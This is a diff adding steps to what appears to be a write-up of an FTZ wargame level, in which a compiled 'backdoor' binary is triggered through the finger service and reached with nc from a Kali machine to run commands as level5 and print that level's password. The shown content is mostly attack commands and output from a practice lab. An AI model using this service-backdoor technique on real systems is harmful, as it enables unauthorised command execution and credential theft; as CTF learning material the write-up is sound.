@@ -85,3 +85,22 @@ int main()
 [level4@ftz tmp]$ gcc -o backdoor backdoor.c
 [level4@ftz tmp]$ chmod 777 backdoor
 ```
+
+```
+[level4@ftz tmp]$ finger level4@localhost
+/bin/bash: line 1: level4
+: command not found
+id
+my-pass
+```
+
+This is not working, cuz you need to use nc(netcat) command in remote
+
+```
+┌──(root💀kali)-[~]
+└─# nc 192.168.10.240 79
+id
+uid=3005(level5) gid=3005(level5)
+my-pass
+Level5 Password is "what is your name?".
+```
